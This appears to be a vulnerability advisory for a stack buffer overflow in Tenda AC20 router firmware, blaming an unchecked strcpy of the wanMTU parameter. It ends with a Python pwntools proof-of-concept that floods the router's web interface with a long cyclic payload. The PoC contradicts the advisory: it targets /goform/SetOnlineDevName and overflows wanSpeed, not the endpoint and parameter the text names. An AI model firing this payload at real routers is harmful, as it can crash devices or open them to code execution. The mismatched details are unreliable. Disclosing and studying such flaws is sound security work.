# Tenda AC20_V16.03.08.05 has a stack overflow in /goform/fromAdvSetMacMtuWan.

## Basic Information

Vulnerability vendor: Shenzhen Jixiang Tengda Technology Co., Ltd.

Vulnerability level: High risk

Vendor website: https://www.tenda.com.cn

Affected object type: Network equipment

Affected product: Tenda AC20

Affected product version: AC20_V16.03.08.05

Is it a product component vulnerability: No

## 1. Vulnerability Overview

The Tenda AC20 is a wireless router manufactured by Tenda, a Chinese company. The Tenda AC20 contains a buffer overflow vulnerability stemming from the failure to properly validate the length of input data in the parameter wanMTU in the file /goform/fromAdvSetMacMtuWan. An attacker could exploit this vulnerability to execute arbitrary code on the system.

## 2. Details of the vulnerability

ida analysis of the .bin/httpd binary file, romAdvSetMacMtuWan is primarily responsible for obtaining the number of WAN ports from wans.flag and executing the sub_44B6D4 function on each WAN port.

![image-20250825154029495](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250825154029495.png)

The wanMTU parameter is retrieved and stored in nptr using the strcpy function. The strcpy function does not check the size of the target buffer when processing the wanMTU parameter. If the copied data exceeds the buffer's capacity, a buffer overflow may occur. An attacker could easily execute a denial-of-service attack or remote code execution using carefully crafted overflow data.

![image-20250825154056858](https://cdn.jsdelivr.net/gh/Thir0th/blog-image/image-20250825154056858.png)

## Poc

```
from pwn import *
import requests

payload = cyclic(0x500)
url = "http://192.168.87.135/goform/SetOnlineDevName"

cookie = {"Cookie":"password=12345"}

data = {"SET": "erger",
    "wanMTU": "m",
    "wanSpeed": payload,
    "wanSpeed2": "300",
    "cloneType": "t",
    "cloneType2": "tt",
    "mac": "192.168.2.3",
    "mac2": "192.168.3.4",
    "serviceName":"admin",
    "serviceName2":"admin2",
    "serverName":"rr",
    "serverName2":"dd"}



response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
print(response.text)

```

